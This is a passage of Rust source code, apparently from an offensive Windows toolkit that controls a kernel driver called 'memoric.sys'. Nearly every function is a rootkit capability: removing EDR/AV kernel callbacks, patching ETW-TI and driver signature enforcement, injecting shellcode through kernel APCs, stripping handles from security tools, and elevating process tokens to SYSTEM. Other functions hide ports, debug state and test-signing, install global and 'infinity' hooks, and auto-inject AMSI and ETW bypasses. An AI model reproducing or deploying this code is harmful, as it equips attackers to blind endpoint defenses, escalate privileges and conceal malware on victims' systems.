    let index = require_u64_param(args, "index", "kernel", "driver_callback_remove")? as u32;
    let addr = args
        .get("callback_address")
        .and_then(|v| {
            v.as_str()
                .and_then(|s| {
                    u64::from_str_radix(s.trim_start_matches("0x").trim_start_matches("0X"), 16)
                        .ok()
                })
                .or_else(|| v.as_u64())
        })
        .unwrap_or(0);

    let cb_type = match type_str {
        "process" => CALLBACK_TYPE_PROCESS,
        "thread" => CALLBACK_TYPE_THREAD,
        "image" | "load_image" => CALLBACK_TYPE_IMAGE,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_callback_remove",
                "callback_type",
                type_str,
                "process, thread, image",
            ))
        }
    };

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    drv.callback_remove(cb_type, index, addr)
        .map_err(|e| e.to_string())?;

    Ok(serde_json::json!({
        "success": true,
        "technique": "memoric_driver_callback_remove",
        "driver": "memoric.sys",
        "callback_type": type_str,
        "index": index,
        "callback_address": format!("0x{:016X}", addr),
        "message": format!("Removed {} callback at index {} — EDR/AV callback neutralized via direct kernel memory patching", type_str, index)
    }))
}

fn driver_patch_kernel(args: &Value) -> Result<Value, String> {
    use crate::driver::{MemoricDriver, PATCH_TYPE_DSE, PATCH_TYPE_ETW_TI};

    let patch_str = require_str_param(
        args,
        "patch_type",
        "kernel",
        "driver_patch_kernel",
        Some("Use 'etw_ti' or 'dse'."),
    )?;
    let enable = args
        .get("enable")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);

    let patch_type = match patch_str {
        "etw_ti" | "etw" => PATCH_TYPE_ETW_TI,
        "dse" => PATCH_TYPE_DSE,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_patch_kernel",
                "patch_type",
                patch_str,
                "etw_ti, dse",
            ))
        }
    };

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    drv.patch_kernel(patch_type, enable)
        .map_err(|e| e.to_string())?;

    let action_str = if enable {
        "restored"
    } else {
        "patched (disabled)"
    };

    Ok(serde_json::json!({
        "success": true,
        "technique": "memoric_driver_patch_kernel",
        "driver": "memoric.sys",
        "patch_type": patch_str,
        "enable": enable,
        "message": format!("{} {} at kernel level via CR0.WP bypass", patch_str.to_uppercase(), action_str)
    }))
}

fn driver_apc_inject(args: &Value) -> Result<Value, String> {
    use crate::driver::MemoricDriver;

    let pid = require_u64_param(args, "pid", "kernel", "driver_apc_inject")? as u32;
    let tid = args.get("thread_id").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
    let addr = require_u64_param(args, "shellcode_address", "kernel", "driver_apc_inject")?;
    let size = require_u64_param(args, "shellcode_size", "kernel", "driver_apc_inject")? as u32;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    drv.apc_inject(pid, tid, addr, size)
        .map_err(|e| e.to_string())?;

    Ok(serde_json::json!({
        "success": true,
        "technique": "memoric_driver_apc_inject",
        "driver": "memoric.sys",
        "pid": pid,
        "thread_id": tid,
        "shellcode_address": format!("0x{:016X}", addr),
        "shellcode_size": size,
        "message": format!("Kernel APC queued to PID {} (TID {}) — shellcode at 0x{:016X} will execute on next thread alert check", pid, tid, addr)
    }))
}

fn driver_handle_strip(args: &Value) -> Result<Value, String> {
    use crate::driver::{MemoricDriver, HANDLE_STRIP_PROCESS};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or("Missing 'pid'")? as u32;
    let strip_type = args
        .get("strip_type")
        .and_then(|v| v.as_str())
        .map(|s| match s {
            "thread" => 1u32,
            _ => 0u32,
        })
        .unwrap_or(HANDLE_STRIP_PROCESS);
    let access_mask = args
        .get("access_mask")
        .and_then(|v| v.as_u64())
        .unwrap_or(0) as u32;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let resp = drv
        .handle_strip(pid, strip_type, access_mask)
        .map_err(|e| e.to_string())?;

    Ok(serde_json::json!({
        "success": true,
        "technique": "memoric_driver_handle_strip",
        "driver": "memoric.sys",
        "target_pid": pid,
        "handles_closed": resp.handles_modified,
        "message": format!("Closed {} handles to PID {} from other processes — EDR/AV can no longer query or manipulate this process", resp.handles_modified, pid)
    }))
}

fn driver_reg_protect(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let reg_action = args
        .get("reg_action")
        .and_then(|v| v.as_str())
        .unwrap_or("list");
    let action = match reg_action {
        "add" => REG_PROTECT_ADD,
        "remove" => REG_PROTECT_REMOVE,
        "list" => REG_PROTECT_LIST,
        "clear" => REG_PROTECT_CLEAR,
        _ => {
            return Err(format!(
                "Invalid reg_action: {} (use add/remove/list/clear)",
                reg_action
            ))
        }
    };

    let flags = match args
        .get("reg_flags")
        .and_then(|v| v.as_str())
        .unwrap_or("all")
    {
        "delete" => REG_PROTECT_BLOCK_DELETE,
        "modify" => REG_PROTECT_BLOCK_MODIFY,
        "create" => REG_PROTECT_BLOCK_CREATE,
        _ => REG_PROTECT_BLOCK_ALL,
    };

    let key_path = args.get("key_path").and_then(|v| v.as_str()).unwrap_or("");

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let entries = drv
        .reg_protect(action, flags, key_path)
        .map_err(|e| e.to_string())?;

    if action == REG_PROTECT_LIST {
        let list: Vec<Value> = entries
            .iter()
            .map(|e| {
                json!({
                    "index": e.index,
                    "flags": e.flags,
                    "key_path": e.key_path_str(),
                })
            })
            .collect();
        Ok(json!({
            "success": true,
            "technique": "memoric_driver_reg_protect",
            "driver": "memoric.sys",
            "action": reg_action,
            "protected_keys": list,
            "count": list.len()
        }))
    } else {
        Ok(json!({
            "success": true,
            "technique": "memoric_driver_reg_protect",
            "driver": "memoric.sys",
            "action": reg_action,
            "key_path": key_path,
            "flags": flags,
            "message": format!("Registry protection '{}' completed for: {}", reg_action, key_path)
        }))
    }
}

fn driver_notify_routine(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let notify_action = require_str_param(
        args,
        "notify_action",
        "kernel",
        "driver_notify_routine",
        Some("Use one of: register, unregister, query."),
    )?;
    let notify_type_str = args
        .get("notify_type")
        .and_then(|v| v.as_str())
        .unwrap_or("process");
    let notify_type = match notify_type_str {
        "process" => NOTIFY_PROCESS_CREATE,
        "thread" => NOTIFY_THREAD_CREATE,
        "image" => NOTIFY_IMAGE_LOAD,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_notify_routine",
                "notify_type",
                notify_type_str,
                "process, thread, image",
            ))
        }
    };

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;

    match notify_action {
        "register" => {
            drv.notify_register(notify_type)
                .map_err(|e| e.to_string())?;
            Ok(json!({
                "success": true,
                "technique": "memoric_driver_notify_routine",
                "driver": "memoric.sys",
                "action": "register",
                "notify_type": notify_type_str,
                "message": format!("Registered {} notification callback — events will accumulate in kernel ring buffer", notify_type_str)
            }))
        }
        "unregister" => {
            drv.notify_unregister(notify_type)
                .map_err(|e| e.to_string())?;
            Ok(json!({
                "success": true,
                "technique": "memoric_driver_notify_routine",
                "driver": "memoric.sys",
                "action": "unregister",
                "notify_type": notify_type_str,
                "message": format!("Unregistered {} notification callback", notify_type_str)
            }))
        }
        "query" => {
            let max_events = args
                .get("max_events")
                .and_then(|v| v.as_u64())
                .unwrap_or(64) as u32;
            let events = drv.notify_query(max_events).map_err(|e| e.to_string())?;
            let event_list: Vec<Value> = events
                .iter()
                .map(|evt| {
                    let type_str = match evt.event_type {
                        0 => "process",
                        1 => "thread",
                        2 => "image",
                        _ => "unknown",
                    };
                    json!({
                        "type": type_str,
                        "pid": evt.process_id,
                        "tid": evt.thread_id,
                        "ppid": evt.parent_process_id,
                        "image_base": format!("0x{:016X}", evt.image_base),
                        "image_size": evt.image_size,
                        "timestamp": evt.timestamp,
                        "create": evt.create != 0,
                        "image_name": evt.image_name_str(),
                    })
                })
                .collect();
            Ok(json!({
                "success": true,
                "technique": "memoric_driver_notify_routine",
                "driver": "memoric.sys",
                "action": "query",
                "event_count": event_list.len(),
                "events": event_list
            }))
        }
        _ => Err(invalid_choice_error(
            "kernel",
            "driver_notify_routine",
            "notify_action",
            notify_action,
            "register, unregister, query",
        )),
    }
}

fn driver_pe_dump(args: &Value) -> Result<Value, String> {
    use crate::driver::MemoricDriver;

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or("Missing 'pid'")? as u32;
    let base_address = args
        .get("base_address")
        .and_then(|v| v.as_str())
        .map(|s| {
            let s = s
                .strip_prefix("0x")
                .or_else(|| s.strip_prefix("0X"))
                .unwrap_or(s);
            u64::from_str_radix(s, 16).unwrap_or(0)
        })
        .unwrap_or(0);
    let max_size = args
        .get("max_dump_size")
        .and_then(|v| v.as_u64())
        .unwrap_or(0) as u32;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let (resp, pe_bytes) = drv
        .pe_dump(pid, base_address, max_size)
        .map_err(|e| e.to_string())?;

    // Save to temp file
    let dump_path = format!("memoric_dump_{}_{:016X}.bin", pid, resp.base_address);
    std::fs::write(&dump_path, &pe_bytes).map_err(|e| format!("Failed to write dump: {}", e))?;

    Ok(json!({
        "success": true,
        "technique": "memoric_driver_pe_dump",
        "driver": "memoric.sys",
        "pid": pid,
        "base_address": format!("0x{:016X}", resp.base_address),
        "image_size": resp.image_size,
        "dumped_bytes": pe_bytes.len(),
        "dump_file": dump_path,
        "message": format!("Dumped {} bytes of PE image from PID {} (base 0x{:016X}) via kernel MmCopyVirtualMemory", pe_bytes.len(), pid, resp.base_address)
    }))
}

fn driver_set_debug_port(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or("Missing 'pid'")? as u32;
    let debug_action_str = args
        .get("debug_action")
        .and_then(|v| v.as_str())
        .unwrap_or("hide");
    let action = match debug_action_str {
        "clear_port" => DEBUG_CLEAR_PORT,
        "no_debug" => DEBUG_SET_NO_DEBUG,
        "hide" => DEBUG_HIDE_FROM_DBG,
        _ => {
            return Err(format!(
                "Invalid debug_action: {} (use clear_port/no_debug/hide)",
                debug_action_str
            ))
        }
    };

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    drv.set_debug_port(pid, action).map_err(|e| e.to_string())?;

    let desc = match debug_action_str {
        "clear_port" => "Zeroed EPROCESS.DebugPort — process appears undebugged",
        "no_debug" => "Set NoDebugInherit flag — child processes cannot be debugged",
        "hide" => "Full debug hide: DebugPort zeroed + NoDebugInherit set",
        _ => "Unknown",
    };

    Ok(json!({
        "success": true,
        "technique": "memoric_driver_set_debug_port",
        "driver": "memoric.sys",
        "pid": pid,
        "action": debug_action_str,
        "message": format!("PID {} anti-debug applied: {}", pid, desc)
    }))
}

fn driver_dpc_timer(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let dpc_action = args
        .get("dpc_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let index = args
        .get("timer_index")
        .and_then(|v| v.as_u64())
        .unwrap_or(0) as u32;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;

    match dpc_action {
        "schedule" => {
            let delay_ms = args
                .get("delay_ms")
                .and_then(|v| v.as_u64())
                .unwrap_or(5000);
            let pid = args.get("pid").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
            let op_str = args
                .get("dpc_operation")
                .and_then(|v| v.as_str())
                .unwrap_or("log");
            let operation = match op_str {
                "hide_process" => DPC_OP_HIDE_PROCESS,
                "escalate_token" => DPC_OP_ESCALATE_TOKEN,
                _ => DPC_OP_LOG,
            };
            drv.dpc_schedule(index, delay_ms, pid, operation)
                .map_err(|e| e.to_string())?;
            Ok(json!({
                "success": true,
                "technique": "memoric_driver_dpc_timer",
                "driver": "memoric.sys",
                "action": "schedule",
                "timer_index": index,
                "delay_ms": delay_ms,
                "target_pid": pid,
                "operation": op_str,
                "message": format!("DPC timer {} scheduled: {}ms delay, operation={} on PID {}", index, delay_ms, op_str, pid)
            }))
        }
        "cancel" => {
            drv.dpc_cancel(index).map_err(|e| e.to_string())?;
            Ok(json!({
                "success": true,
                "technique": "memoric_driver_dpc_timer",
                "driver": "memoric.sys",
                "action": "cancel",
                "timer_index": index,
                "message": format!("DPC timer {} cancelled", index)
            }))
        }
        "query" => {
            let resp = drv.dpc_query(index).map_err(|e| e.to_string())?;
            Ok(json!({
                "success": true,
                "technique": "memoric_driver_dpc_timer",
                "driver": "memoric.sys",
                "action": "query",
                "timer_index": resp.timer_index,
                "active": resp.active != 0,
                "fire_count": resp.fire_count
            }))
        }
        _ => Err(invalid_choice_error(
            "kernel",
            "driver_dpc_timer",
            "dpc_action",
            dpc_action,
            "schedule, cancel, query",
        )),
    }
}

fn driver_port_hide(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let port_action = args
        .get("port_action")
        .and_then(|v| v.as_str())
        .unwrap_or("list");
    let action = match port_action {
        "add" => PORT_HIDE_ADD,
        "remove" => PORT_HIDE_REMOVE,
        "list" => PORT_HIDE_LIST,
        "clear" => PORT_HIDE_CLEAR,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_port_hide",
                "port_action",
                port_action,
                "add, remove, list, clear",
            ))
        }
    };
    let port = args.get("port").and_then(|v| v.as_u64()).unwrap_or(0) as u16;
    let protocol_str = args
        .get("protocol")
        .and_then(|v| v.as_str())
        .unwrap_or("tcp");
    let protocol = match protocol_str {
        "tcp" => PORT_PROTOCOL_TCP,
        "udp" => PORT_PROTOCOL_UDP,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_port_hide",
                "protocol",
                protocol_str,
                "tcp, udp",
            ))
        }
    };

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let entries = drv
        .port_hide(action, port, protocol)
        .map_err(|e| e.to_string())?;

    if action == PORT_HIDE_LIST {
        let list: Vec<Value> = entries
            .iter()
            .map(|e| {
                json!({
                    "port": e.port,
                    "protocol": if e.protocol == 0 { "tcp" } else { "udp" },
                })
            })
            .collect();
        Ok(json!({
            "success": true,
            "technique": "memoric_driver_port_hide",
            "driver": "memoric.sys",
            "action": port_action,
            "hidden_ports": list,
            "count": list.len()
        }))
    } else {
        Ok(json!({
            "success": true,
            "technique": "memoric_driver_port_hide",
            "driver": "memoric.sys",
            "action": port_action,
            "port": port,
            "protocol": if protocol == 0 { "tcp" } else { "udp" },
            "message": format!("Port hide '{}': {} port {}", port_action, if protocol == 0 { "TCP" } else { "UDP" }, port)
        }))
    }
}

fn driver_token_dup(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let pid = require_u64_param(args, "pid", "kernel", "driver_token_dup")? as u32;
    let source_pid = args.get("source_pid").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
    let token_action = args
        .get("token_action")
        .and_then(|v| v.as_str())
        .unwrap_or("system");
    let action = match token_action {
        "copy" => TOKEN_DUP_COPY,
        "system" => TOKEN_DUP_SYSTEM,
        "restore" => TOKEN_DUP_RESTORE,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_token_dup",
                "token_action",
                token_action,
                "copy, system, restore",
            ))
        }
    };

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let resp = drv
        .token_dup(pid, source_pid, action)
        .map_err(|e| e.to_string())?;

    Ok(json!({
        "success": true,
        "technique": "memoric_driver_token_dup",
        "driver": "memoric.sys",
        "target_pid": resp.target_pid,
        "source_pid": resp.source_pid,
        "original_token": format!("0x{:016X}", resp.original_token),
        "new_token": format!("0x{:016X}", resp.new_token),
        "action": token_action,
        "message": format!("Token duplicated: PID {} now has token from PID {} (0x{:016X} -> 0x{:016X})",
            resp.target_pid, resp.source_pid, resp.original_token, resp.new_token)
    }))
}

fn driver_object_hook(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let obj_action = args
        .get("obj_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;

    match obj_action {
        "register" => {
            let protect_pid =
                require_u64_param(args, "protect_pid", "kernel", "driver_object_hook")? as u32;
            let strip_access = args
                .get("strip_access")
                .and_then(|v| v.as_u64())
                .unwrap_or(0x1FFFFF) as u32;
            drv.object_hook_register(protect_pid, strip_access)
                .map_err(|e| e.to_string())?;
            Ok(json!({
                "success": true,
                "technique": "memoric_driver_object_hook",
                "driver": "memoric.sys",
                "action": "register",
                "protect_pid": protect_pid,
                "strip_access": format!("0x{:08X}", strip_access),
                "message": format!("Object callback registered: PID {} protected, stripping access 0x{:08X} from all handle opens", protect_pid, strip_access)
            }))
        }
        "unregister" => {
            drv.object_hook_unregister().map_err(|e| e.to_string())?;
            Ok(json!({
                "success": true,
                "technique": "memoric_driver_object_hook",
                "driver": "memoric.sys",
                "action": "unregister",
                "message": "Object callback unregistered — process protection removed"
            }))
        }
        "query" => {
            let resp = drv.object_hook_query().map_err(|e| e.to_string())?;
            Ok(json!({
                "success": true,
                "technique": "memoric_driver_object_hook",
                "driver": "memoric.sys",
                "action": "query",
                "registered": resp.registered != 0,
                "interception_count": resp.interception_count,
                "protected_pid": resp.protected_pid,
                "stripped_access": format!("0x{:08X}", resp.stripped_access)
            }))
        }
        _ => Err(invalid_choice_error(
            "kernel",
            "driver_object_hook",
            "obj_action",
            obj_action,
            "register, unregister, query",
        )),
    }
}

fn driver_stats(_args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let s = drv.driver_stats().map_err(|e| e.to_string())?;

    let version_major = s.driver_version >> 16;
    let version_minor = s.driver_version & 0xFFFF;

    Ok(json!({
        "success": true,
        "technique": "memoric_driver_stats",
        "driver": "memoric.sys",
        "version": format!("{}.{}", version_major, version_minor),
        "build_number": s.build_number,
        "offsets_resolved": s.offsets_resolved != 0,
        "ioctls": {
            "total": s.total_ioctls,
            "success": s.success_ioctls,
            "failed": s.failed_ioctls,
            "exceptions": s.exception_count
        },
        "handles": s.open_handles,
        "callbacks": {
            "process_notify": s.notify_process_active != 0,
            "thread_notify": s.notify_thread_active != 0,
            "image_notify": s.notify_image_active != 0,
            "registry_callback": s.reg_callback_active != 0,
            "object_callback": s.ob_callback_active != 0
        },
        "active_features": {
            "dpc_timers": s.dpc_timers_active,
            "hidden_ports": s.hidden_port_count,
            "protected_keys": s.protected_key_count
        },
        "message": format!("Driver v{}.{} — {} IOCTLs ({}ok/{}fail/{}ex), {} handles, build {}",
            version_major, version_minor,
            s.total_ioctls, s.success_ioctls, s.failed_ioctls, s.exception_count,
            s.open_handles, s.build_number)
    }))
}

fn driver_memory_pool(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let pool_tag = args
        .get("pool_tag")
        .and_then(|v| {
            v.as_u64().or_else(|| {
                v.as_str().map(|s| {
                    let bytes = s.as_bytes();
                    let mut tag = [0u8; 4];
                    for (idx, byte) in bytes.iter().take(4).enumerate() {
                        tag[idx] = *byte;
                    }
                    u32::from_le_bytes(tag) as u64
                })
            })
        })
        .unwrap_or(0) as u32;
    let max_entries = args
        .get("max_entries")
        .and_then(|v| v.as_u64())
        .unwrap_or(256) as u32;

    let (header, entries) = drv
        .memory_pool_query(pool_tag, max_entries)
        .map_err(|e| e.to_string())?;

    let entries_json: Vec<Value> = entries
        .iter()
        .map(|e| {
            let tag_bytes = e.pool_tag.to_le_bytes();
            let tag_str = String::from_utf8_lossy(&tag_bytes).to_string();
            json!({
                "tag": tag_str,
                "tag_raw": format!("0x{:08X}", e.pool_tag),
                "address": format!("0x{:016X}", e.address),
                "size": e.size,
                "pool_type": if e.pool_type == 0 { "NonPaged" } else { "Paged" }
            })
        })
        .collect();

    Ok(json!({
        "success": true,
        "technique": "memoric_memory_pool",
        "entry_count": header.entry_count,
        "total_allocations": header.total_allocations,
        "entries": entries_json,
        "message": format!("Pool query: {} entries returned ({} total matching)",
            header.entry_count, header.total_allocations)
    }))
}

fn driver_minifilter_enum(_args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let entries = drv.minifilter_enum().map_err(|e| e.to_string())?;

    let entries_json: Vec<Value> = entries
        .iter()
        .map(|e| {
            let name = String::from_utf16_lossy(&e.filter_name)
                .trim_end_matches('\0')
                .to_string();
            let altitude = String::from_utf16_lossy(&e.altitude)
                .trim_end_matches('\0')
                .to_string();
            json!({
                "name": name,
                "altitude": altitude,
                "frame_id": e.frame_id,
                "instances": e.number_of_instances,
                "flags": format!("0x{:08X}", e.flags)
            })
        })
        .collect();

    Ok(json!({
        "success": true,
        "technique": "memoric_minifilter_enum",
        "filter_count": entries.len(),
        "filters": entries_json,
        "message": format!("Found {} filter drivers", entries.len())
    }))
}

fn driver_process_dump(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let pid = require_u64_param(args, "pid", "kernel", "driver_process_dump")? as u32;
    let flags = args.get("flags").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
    let base_address = parse_u64_arg(args.get("base_address")).unwrap_or(0);
    let max_size = args
        .get("max_size")
        .and_then(|v| v.as_u64())
        .or_else(|| args.get("max_dump_size").and_then(|v| v.as_u64()))
        .unwrap_or(0);

    let (header, regions) = drv
        .process_dump(pid, flags, base_address, max_size)
        .map_err(|e| e.to_string())?;

    let regions_json: Vec<Value> = regions
        .iter()
        .map(|r| {
            let state_str = match r.state {
                0x1000 => "MEM_COMMIT",
                0x2000 => "MEM_RESERVE",
                0x10000 => "MEM_FREE",
                _ => "UNKNOWN",
            };
            let type_str = match r.region_type {
                0x1000000 => "MEM_IMAGE",
                0x40000 => "MEM_MAPPED",
                0x20000 => "MEM_PRIVATE",
                _ => "UNKNOWN",
            };
            json!({
                "base": format!("0x{:016X}", r.base_address),
                "size": r.region_size,
                "state": state_str,
                "protect": format!("0x{:08X}", r.protect),
                "type": type_str
            })
        })
        .collect();

    Ok(json!({
        "success": true,
        "technique": "memoric_process_dump",
        "pid": pid,
        "region_count": header.region_count,
        "total_regions": header.total_regions,
        "total_size": header.total_size,
        "regions": regions_json,
        "message": format!("Process {} dump: {} regions, {} bytes total",
            pid, header.region_count, header.total_size)
    }))
}

fn driver_hypervisor_detect(_args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let r = drv.hypervisor_detect().map_err(|e| e.to_string())?;

    let vendor = String::from_utf8_lossy(&r.vendor_id)
        .trim_end_matches('\0')
        .to_string();
    let type_str = match r.hypervisor_type {
        0 => "None",
        1 => "Hyper-V",
        2 => "VMware",
        3 => "VirtualBox",
        4 => "KVM",
        5 => "QEMU",
        6 => "Xen",
        7 => "Unknown",
        _ => "Unknown",
    };

    Ok(json!({
        "success": true,
        "technique": "memoric_kernel_hypervisor_detect",
        "hypervisor_present": r.hypervisor_present != 0,
        "hypervisor_type": type_str,
        "vendor_id": vendor,
        "nesting_level": r.nesting_level,
        "anomalies": {
            "timing": r.timing_anomaly != 0,
            "msr": r.msr_anomaly != 0,
            "idt": r.idt_anomaly != 0
        },
        "cpuid_leaf_count": r.cpuid_leaf_count,
        "message": format!("Hypervisor: {} ({}), vendor='{}', anomalies: timing={} msr={} idt={}",
            if r.hypervisor_present != 0 { "PRESENT" } else { "NOT PRESENT" },
            type_str, vendor,
            r.timing_anomaly != 0, r.msr_anomaly != 0, r.idt_anomaly != 0)
    }))
}

fn driver_testsign_hide(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let ts_action = args
        .get("testsign_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let action_code = match ts_action {
        "query" => TESTSIGN_QUERY,
        "hide_shared" => TESTSIGN_HIDE_SHARED,
        "hide_ci" => TESTSIGN_HIDE_CI,
        "restore" => TESTSIGN_RESTORE,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_testsign_hide",
                "testsign_action",
                ts_action,
                "query, hide_shared, hide_ci, restore",
            ))
        }
    };

    let r = drv.testsign_hide(action_code).map_err(|e| e.to_string())?;

    Ok(json!({
        "success": true,
        "technique": "memoric_kernel_testsign_hide",
        "action": ts_action,
        "test_signing_active": r.test_signing_active != 0,
        "ci_options": format!("0x{:X}", r.ci_options),
        "shared_user_patched": r.shared_user_patched != 0,
        "ci_options_address": format!("0x{:016X}", r.ci_options_address),
        "shared_user_address": format!("0x{:016X}", r.shared_user_address),
        "message": format!("TestSign {}: active={}, ci_options=0x{:X}, shared_patched={}",
            ts_action, r.test_signing_active != 0, r.ci_options, r.shared_user_patched != 0)
    }))
}

fn driver_global_hook(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let gh_action = args
        .get("hook_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let action_code = match gh_action {
        "install" => GHOOK_INSTALL,
        "remove" => GHOOK_REMOVE,
        "query" => GHOOK_QUERY,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_global_hook",
                "hook_action",
                gh_action,
                "install, remove, query",
            ))
        }
    };

    let hook_type_str = args
        .get("hook_type")
        .and_then(|v| v.as_str())
        .unwrap_or("inline");
    let hook_type = match hook_type_str {
        "inline" => GHOOK_TYPE_INLINE,
        "iat" => GHOOK_TYPE_IAT,
        "infinity" => GHOOK_TYPE_INFINITY,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_global_hook",
                "hook_type",
                hook_type_str,
                "inline, iat, infinity",
            ))
        }
    };
    let hook_index = args.get("hook_index").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
    let module = args
        .get("target_module")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let function = args
        .get("target_function")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let replacement = parse_u64_arg(args.get("replacement_addr")).unwrap_or(0);

    let output = drv
        .global_hook(
            action_code,
            hook_type,
            hook_index,
            module,
            function,
            replacement,
        )
        .map_err(|e| e.to_string())?;

    if output.len() >= std::mem::size_of::<GlobalHookResponse>() {
        let resp = unsafe { &*(output.as_ptr() as *const GlobalHookResponse) };
        Ok(json!({
            "success": true,
            "technique": "memoric_kernel_global_hook",
            "action": gh_action,
            "hook_count": resp.hook_count,
            "message": format!("GlobalHook {}: {} active hooks", gh_action, resp.hook_count)
        }))
    } else {
        Ok(json!({
            "success": true,
            "technique": "memoric_kernel_global_hook",
            "action": gh_action,
            "message": format!("GlobalHook {} completed", gh_action)
        }))
    }
}

fn driver_auto_inject(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let ai_action = args
        .get("inject_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let action_code = match ai_action {
        "enable" => AUTOINJECT_ENABLE,
        "disable" => AUTOINJECT_DISABLE,
        "query" => AUTOINJECT_QUERY,
        "set_payload" => AUTOINJECT_SET_PAYLOAD,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_auto_inject",
                "inject_action",
                ai_action,
                "enable, disable, query, set_payload",
            ))
        }
    };

    let mut flags: u32 = 0;
    if let Some(f) = args.get("inject_flags") {
        if let Some(arr) = f.as_array() {
            for flag in arr {
                match flag.as_str().unwrap_or("") {
                    "ntquery" => flags |= AUTOINJECT_FLAG_NTQUERY,
                    "etw" => flags |= AUTOINJECT_FLAG_ETW,
                    "amsi" => flags |= AUTOINJECT_FLAG_AMSI,
                    "custom" => flags |= AUTOINJECT_FLAG_CUSTOM,
                    _ => {}
                }
            }
        } else if let Some(n) = f.as_u64() {
            flags = n as u32;
        }
    }

    let filter = args
        .get("process_filter")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let r = drv
        .auto_inject(action_code, flags, filter)
        .map_err(|e| e.to_string())?;

    Ok(json!({
        "success": true,
        "technique": "memoric_kernel_auto_inject",
        "action": ai_action,
        "enabled": r.enabled != 0,
        "flags": r.flags,
        "processes_injected": r.processes_injected,
        "processes_failed": r.processes_failed,
        "processes_skipped": r.processes_skipped,
        "process_filter": r.filter_str(),
        "message": format!("AutoInject {}: enabled={}, injected={}, failed={}, skipped={}",
            ai_action, r.enabled != 0, r.processes_injected, r.processes_failed, r.processes_skipped)
    }))
}

fn driver_infinity_hook(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let ih_action = args
        .get("infhook_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    let action_code = match ih_action {
        "enable" => INFHOOK_ENABLE,
        "disable" => INFHOOK_DISABLE,
        "query" => INFHOOK_QUERY,
        _ => {
            return Err(invalid_choice_error(
                "kernel",
                "driver_infinity_hook",
                "infhook_action",
                ih_action,
                "enable, disable, query",
            ))
        }
    };

    let syscall_number = args
        .get("syscall_number")
        .and_then(|v| v.as_u64())
        .unwrap_or(0) as u32;
